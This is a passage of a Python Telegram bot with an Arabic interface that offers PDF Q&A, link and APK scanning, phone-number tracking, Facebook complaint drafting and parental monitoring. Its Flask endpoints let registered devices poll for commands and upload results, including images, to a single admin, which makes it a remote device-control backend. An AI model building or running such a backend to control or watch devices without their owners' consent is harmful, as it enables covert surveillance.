                safe_send(chat_id, "⚠️ لم يتم تحميل ملف PDF.")
                user_states[chat_id] = None
                return
            safe_send(chat_id, "⏳ جاري البحث عن الإجابة...")
            answer = answer_question_from_pdf(pdf_text, text)
            safe_send(chat_id, f"📚 الإجابة\n{answer}")
            return

        if state == "waiting_for_site":
            if re.match(r'^https?://', text):
                safe_send(chat_id, "⏳ جاري فحص الموقع...")
                result, status = scan_website(text)
                safe_send(chat_id, f"🔍 نتيجة الفحص\n{result}")
            else:
                safe_send(chat_id, "❌ رابط غير صالح.")
            user_states[chat_id] = None
            return

        if state == "waiting_for_ai":
            safe_send(chat_id, "⏳ جاري معالجة السؤال...")
            response = get_ai_response(text)
            safe_send(chat_id, response)
            user_states[chat_id] = None
            return

        if state == "waiting_for_image":
            if len(text) < 5:
                safe_send(chat_id, "❌ الوصف قصير.")
                return
            safe_send(chat_id, "⏳ جاري إنشاء الصورة...")
            success = generate_and_send_image(chat_id, text)
            if not success:
                safe_send(chat_id, "⚠️ فشل إنشاء الصورة. حاول مرة أخرى.")
            user_states[chat_id] = None
            return

        if state == "waiting_for_track_num":
            result, status = track_phone_real(text)
            safe_send(chat_id, result)
            user_states[chat_id] = None
            return

        if state == "waiting_for_fb_report_reason":
            reason = text
            user_states[chat_id] = "waiting_for_fb_report_link"
            user_states[f"{chat_id}_fb_report_reason"] = reason
            safe_send(chat_id, "✅ تم حفظ السبب.\n\nأرسل رابط المنشور (أو اكتب 'لا يوجد').")
            return

        if state == "waiting_for_fb_report_link":
            link = text if text.lower() != 'لا يوجد' else ''
            report_type = user_states.get(f"{chat_id}_fb_report_type")
            reason = user_states.get(f"{chat_id}_fb_report_reason")
            if not report_type or not reason:
                safe_send(chat_id, "❌ حدث خطأ.")
                user_states[chat_id] = None
                return
            safe_send(chat_id, "⏳ جاري إنشاء الشكوى...")
            report_text = generate_fb_report(report_type, reason, link)
            support_links = {
                "حساب مزيف": "https://www.facebook.com/help/contact/169486816475808",
                "منشور مسيء": "https://www.facebook.com/help/contact/315847653073855",
                "تحرش أو مضايقة": "https://www.facebook.com/help/contact/237547145079192",
                "انتحال شخصية": "https://www.facebook.com/help/contact/165143319009650",
                "انتهاك خصوصية": "https://www.facebook.com/help/contact/144059085608922"
            }
            support_link = "https://www.facebook.com/help/contact/357439354283890"
            for key, url in support_links.items():
                if key in report_type:
                    support_link = url
                    break
            final_msg = (
                f"📝 شكوى رسمية\n\n"
                f"{report_text}\n\n"
                f"🔗 رابط الدعم: {support_link}\n\n"
                f"📌 انسخ النص أعلاه، ثم اضغط على الرابط، والصق النص في نموذج الإبلاغ."
            )
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("🌐 فتح رابط الدعم", url=support_link))
            markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
            safe_send(chat_id, final_msg, reply_markup=markup)
            for key in [f"{chat_id}_fb_report_type", f"{chat_id}_fb_report_reason"]:
                if key in user_states:
                    del user_states[key]
            user_states[chat_id] = None
            feature_usage["بلاغات فيسبوك"] += 1
            return

        if state == "waiting_for_download":
            if not re.match(r'^https?://', text):
                safe_send(chat_id, "❌ رابط غير صالح.")
                user_states[chat_id] = None
                return
            safe_send(chat_id, "⏳ جاري تحميل الفيديو...")
            result, error = download_video(text)
            if error:
                safe_send(chat_id, f"⚠️ {error}")
            elif result and os.path.exists(result):
                try:
                    with open(result, 'rb') as f:
                        bot.send_video(chat_id, f, caption="📥 تم التحميل بنجاح")
                    os.remove(result)
                except Exception as e:
                    safe_send(chat_id, f"⚠️ فشل إرسال الفيديو: {str(e)}")
            else:
                safe_send(chat_id, "⚠️ فشل تحميل الفيديو.")
            user_states[chat_id] = None
            return

        if chat_id in linked_users and state is None:
            device_info = get_device(chat_id)
            if device_info and "طفل" in device_info['type']:
                blocked = get_blocked_domains(chat_id)
                urls = re.findall(r'https?://([^/\s]+)', text)
                for domain in urls:
                    if domain in blocked:
                        safe_send(chat_id, f"🚫 تم حظر هذا الموقع.")
                        safe_send(ADMIN_ID, f"🚸 حظر موقع من الطفل {chat_id}: {domain}")
                        log_child_activity(chat_id, f"محاولة زيارة موقع محظور: {domain}")
                        return
            urls = re.findall(r'https?://[^\s]+', text)
            for url in urls:
                result, status = scan_website(url)
                if status in ['malicious', 'suspicious'] or "تهديد" in result:
                    safe_send(chat_id, f"🚨 تحذير: الرابط {url} قد يكون خطيراً.\n{result}")
                    safe_send(ADMIN_ID, f"⚠️ رابط مشبوه من {chat_id}: {url}")
                    break

        if state is None:
            safe_send(chat_id, "🤖 اختر خدمة من القائمة.", reply_markup=build_main_menu(chat_id))
    except Exception as e:
        logger.error(f"handle_text_messages error: {e}")
        notify_admin(f"خطأ في معالج النصوص: {str(e)}", is_error=True)
        safe_send(chat_id, f"⚠️ حدث خطأ: {str(e)}")

# ===================== معالج الملفات =====================
@bot.message_handler(content_types=['document'])
def handle_documents(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    temp_file_path = None

    try:
        if state == "waiting_for_pdf":
            file = message.document
            file_name = file.file_name or "بدون اسم"
            if not file_name.lower().endswith('.pdf'):
                safe_send(chat_id, "❌ يرجى إرسال ملف PDF.")
                return
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            temp_file_path = os.path.join(TEMP_DIR, file_name)
            with open(temp_file_path, 'wb') as f:
                f.write(downloaded)
            pdf_text = extract_text_from_pdf(downloaded)
            if not pdf_text:
                safe_send(chat_id, "⚠️ فشل استخراج النص.")
                user_states[chat_id] = None
                return
            user_states[f"{chat_id}_pdf_text"] = pdf_text
            user_states[chat_id] = "waiting_for_pdf_question"
            safe_send(
                chat_id,
                f"✅ تم استخراج النص ({len(pdf_text)} حرف).\n\nالآن اكتب سؤالك."
            )
            if temp_file_path and os.path.exists(temp_file_path):
                os.remove(temp_file_path)
            return

        if state == "waiting_for_apk":
            file = message.document
            file_name = file.file_name or "بدون اسم"
            if not file_name.lower().endswith('.apk'):
                safe_send(chat_id, "❌ أرسل ملف APK.")
                return
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            temp_file_path = os.path.join(TEMP_DIR, file_name)
            with open(temp_file_path, 'wb') as f:
                f.write(downloaded)
            safe_send(chat_id, "⏳ جاري فحص الملف...")
            result, status = scan_apk_real(downloaded, file_name)
            safe_send(chat_id, f"📦 نتيجة الفحص\n{result}")
            user_states[chat_id] = None
            return

        if state == "waiting_for_my_app":
            file = message.document
            file_name = file.file_name or "بدون اسم"
            ext = file_name.split('.')[-1].lower()
            if ext not in ['txt', 'py', 'js', 'java', 'cpp', 'c', 'html', 'css', 'php']:
                safe_send(chat_id, "❌ امتداد غير مدعوم.")
                return
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            try:
                content = downloaded.decode('utf-8')
                safe_send(chat_id, "⏳ جاري مراجعة الكود...")
                review = get_ai_response(f"مراجعة الكود التالي واكتشاف الثغرات:\n\n{content[:2000]}")
                safe_send(chat_id, f"🛠️ مراجعة الكود\n{review}")
            except:
                safe_send(chat_id, "⚠️ فشل قراءة الملف.")
            user_states[chat_id] = None
            return

        if chat_id in linked_users:
            safe_send(chat_id, "📎 تم استلام الملف.")
        else:
            safe_send(chat_id, "📎 لفحص الملفات، فعّل الخدمات أولاً.")
    except Exception as e:
        logger.error(f"handle_documents error: {e}")
        notify_admin(f"خطأ في معالج الملفات: {str(e)}", is_error=True)
        safe_send(chat_id, f"⚠️ حدث خطأ: {str(e)}")
    finally:
        if temp_file_path and os.path.exists(temp_file_path):
            try:
                os.remove(temp_file_path)
            except:
                pass

@bot.message_handler(content_types=['photo'])
def handle_photos(message):
    chat_id = message.chat.id
    if chat_id in linked_users:
        safe_send(chat_id, "🖼️ تم استلام الصورة.")
    else:
        safe_send(chat_id, "🖼️ لفحص الصور، فعّل الخدمات أولاً.")

# ===================== معالج الرد الافتراضي =====================
@bot.message_handler(func=lambda message: True)
def default_reply(message):
    if not message.text.startswith('/'):
        safe_send(message.chat.id, "🤖 البوت يعمل. استخدم /start للقائمة.")

# ===================== دوال Flask =====================
def verify_client_token():
    token = request.headers.get('X-Client-Token')
    return token == CLIENT_SECRET_KEY

@app.route('/')
@app.route('/health')
def health():
    return jsonify({'status': 'healthy', 'time': datetime.now().isoformat()})

@app.route('/ping')
def ping():
    return 'pong'

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        json_str = request.get_data().decode('UTF-8')
        update = Update.de_json(json_str)
        if update:
            bot.process_new_updates([update])
            return 'OK', 200
        return 'Error', 400
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return 'Error', 500

@app.route('/register_device', methods=['POST'])
def register_device():
    try:
        if not verify_client_token():
            return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'Invalid JSON'}), 400
        device_id = data.get('device_id')
        chat_id = data.get('chat_id')
        if not device_id or not chat_id:
            return jsonify({'status': 'error', 'message': 'Missing device_id or chat_id'}), 400
        save_registered_device_db(device_id, int(chat_id))
        safe_send(ADMIN_ID, f"📱 جهاز جديد مسجل\n🆔 {device_id}\n👤 المستخدم: {chat_id}")
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/get_command', methods=['GET'])
def get_command():
    try:
        if not verify_client_token():
            return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401
        device_id = request.args.get('device_id')
        if not device_id:
            return jsonify({'status': 'error', 'message': 'Missing device_id'}), 400
        command = get_pending_command_db(device_id)
        if command:
            return jsonify({'status': 'success', 'command': command})
        else:
            return jsonify({'status': 'no_command'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/submit_result', methods=['POST'])
def submit_result():
    try:
        if not verify_client_token():
            return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'Invalid JSON'}), 400
        device_id = data.get('device_id')
        result = data.get('result')
        result_type = data.get('result_type', 'text')
        if not device_id:
            return jsonify({'status': 'error', 'message': 'Missing device_id'}), 400
        update_registered_device_seen_db(device_id)
        if result_type == 'image':
            try:
                img_data = base64.b64decode(result)
                safe_send(ADMIN_ID, f"📸 نتيجة من جهاز {device_id}")
                bot.send_photo(ADMIN_ID, img_data, caption=f"📸 نتيجة من جهاز {device_id}")
            except Exception as e:
                safe_send(ADMIN_ID, f"⚠️ فشل معالجة الصورة من {device_id}: {str(e)}")
        else:
            safe_send(ADMIN_ID, f"📩 نتيجة من {device_id}\n{result}")
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    try:
        if not verify_client_token():
            return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401
        data = request.get_json()
        device_id = data.get('device_id')
        if not device_id:
            return jsonify({'status': 'error', 'message': 'Missing device_id'}), 400
        update_registered_device_seen_db(device_id)
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/admin/devices', methods=['GET'])
def admin_devices():
    try:
        if ADMIN_KEY and request.headers.get('X-Admin-Key') != ADMIN_KEY:
            return jsonify({'error': 'Unauthorized'}), 401
        devices = get_registered_devices_db()
        return jsonify({'devices': [dict(d) for d in devices]})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ===================== إعداد Webhook =====================
def set_webhook():
    if not SERVER_URL:
        return False
    webhook_full_url = f"{SERVER_URL}/webhook"
    try:
        bot.remove_webhook()
        time.sleep(1)
        success = bot.set_webhook(url=webhook_full_url)
        if success:
            logger.info(f"✅ Webhook: {webhook_full_url}")
            return True
        else:
            logger.error("❌ فشل Webhook.")
            return False
    except Exception as e:
        logger.error(f"❌ Webhook error: {e}")
        return False

# ===================== تشغيل التطبيق =====================
if USE_WEBHOOK:
    set_webhook()

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=PORT, debug=False)
